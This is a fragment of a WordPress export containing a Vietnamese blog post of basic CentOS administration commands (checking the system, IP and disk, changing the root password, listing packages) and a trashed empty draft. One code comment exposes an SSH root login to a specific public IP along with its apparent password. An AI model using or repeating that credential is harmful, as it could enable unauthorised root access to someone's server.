		<wp:meta_value><![CDATA[1659104153]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_desired_post_slug]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[CentOS - Cơ bản]]></title>
		<link>https://duycode.com/2022/08/06/centos-co-ban/</link>
		<pubDate>Sat, 06 Aug 2022 09:59:31 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2347</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Cơ bản</h2>
<pre>
// SSH vào OS, password: abc123..
ssh root@103.124.93.214

// Check hệ điều hành
hostnamectl

// Check IP Centos
hostname -i
ifconfig
ip a
ip addr
curl ifconfig.co
curl ifconfig.me

// Đổi mật khẩu root
passwd

// Kiểm tra tình trạng máy
top
// Kiểm tra dung lượng ổ đĩa
df -hT

// Kiểm tra các chương trình đã cài trên CentOs
yum list installed
rpm -qa
</pre>

<h2>2. Cài đặt Docker</h2>
<a href="https://docs.docker.com/engine/install/centos/" rel="noopener" target="_blank">https://docs.docker.com/engine/install/centos/</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2347</wp:post_id>
		<wp:post_date><![CDATA[2022-08-06 09:59:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-08-06 09:59:31]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-06 15:28:21]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-06 15:28:21]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[centos-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="linux"><![CDATA[Linux]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Auto Draft]]></title>
		<link>https://duycode.com/?p=2339</link>
		<pubDate>Fri, 29 Jul 2022 14:37:28 +0000</pubDate>
		<dc:creator><![CDATA[]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2339</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2339</wp:post_id>
		<wp:post_date><![CDATA[2022-07-29 14:37:28]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-07-29 14:37:28]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-29 14:37:28]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-29 14:37:28]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[__trashed-6]]></wp:post_name>
		<wp:status><![CDATA[trash]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="languages"><![CDATA[Languages]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_status]]></wp:meta_key>
		<wp:meta_value><![CDATA[auto-draft]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_time]]></wp:meta_key>
		<wp:meta_value><![CDATA[1659105448]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_desired_post_slug]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
				</channel>
</rss>
	